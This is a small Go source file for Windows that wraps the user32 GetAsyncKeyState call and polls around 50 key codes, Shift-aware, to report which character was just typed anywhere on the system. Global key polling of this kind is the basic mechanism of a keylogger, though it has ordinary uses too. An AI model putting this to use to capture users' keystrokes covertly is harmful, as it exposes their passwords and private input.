package key
import(
	"syscall"
)
var user32 = syscall.NewLazyDLL("user32.dll")
var pGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
func GetAsyncKeyState(nVirtKey int) int {
	ret, _, _ := pGetAsyncKeyState.Call(uintptr(nVirtKey))
	return int(ret)
}
func Scan() byte {
	str0 := "\x08\x0d1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ\xba\xbb\xbc\xbd\xbe\xbf\xc0\xdb\xdc\xdd\xde\xe2"
	b := [] byte(str0)
	str1 := "\x08\x0d!\"#$%&'()0ABCDEFGHIJKLMNOPQRSTUVWXYZ\x2a\x2b\x3c\x3d\x3e\x3f\x60\x7b\x7c\x7d\x7e\x5f"
	c := [] byte(str1)
	str2 := "\x08\x0d1234567890abcdefghijklmnopqrstuvwxyz\x3a\x3b\x2c\x2d\x2e\x2f\x40\x5b\x5c\x5d\x5e\x5f"
	d := [] byte(str2)
	i := 0
	j := 0
	k := 0
	for i = 0; i < 50; i++ {
		if GetAsyncKeyState(0x10) & 0x8000 == 0x8000 {
			j = int(c[i])
		} else {
			j = int(d[i])
		}
		if GetAsyncKeyState(int(b[i])) & 0x0001 == 0x0001 {
			k = j
		}
	}
	if k > 0 {
		return byte(k)
	} else {
		return byte(0)
	}
}
